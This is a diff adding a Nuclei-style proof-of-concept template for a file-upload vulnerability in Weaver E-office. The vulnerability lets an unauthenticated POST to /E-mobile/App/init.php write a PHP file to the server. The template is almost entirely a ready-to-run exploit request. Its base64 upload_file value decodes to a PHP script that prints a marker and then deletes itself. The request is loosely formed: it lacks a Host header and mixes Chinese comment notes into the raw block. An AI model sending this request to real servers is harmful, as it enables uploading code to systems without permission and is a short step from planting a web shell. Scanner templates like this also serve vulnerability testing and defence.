@@ -1,0 +1,39 @@
+id: poc-ryf0147gutu7viux
+info:
+  name: 泛微 E-office FlowCommon.class.php 文件上传漏洞
+  author: hacktwo
+  severity: high
+  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/ryf0147gutu7viux'
+  tags: file-upload,2024
+  metadata:
+    source: yuque-hacktwo-dtdx2v
+    doc-slug: ryf0147gutu7viux
+    fofa: 暂无
+http:
+- raw:
+  - 'POST /E-mobile/App/init.php HTTP/1.1
+
+
+
+
+    m=common_Common_Flow&f=flowDo&diff=feedback&RUN_ID=1&USER_ID=1&CONTENT=1&FLOW_ID=1&upload_file=PD9waHAgZWNobyAiMTIzNDU2NzgiO3VubGluayhfX0ZJTEVfXyk7Pz4=&file_name=test123.php
+
+
+    # 响应代码特征
+
+    200
+
+
+    # 响应内容特征
+
+    ^(?=.*?url)(?=.*?diff).*?$
+
+
+    # 上传文件定位
+
+    暂无'
+  redirects: false
+  matchers:
+  - status:
+    - 200
+    type: status
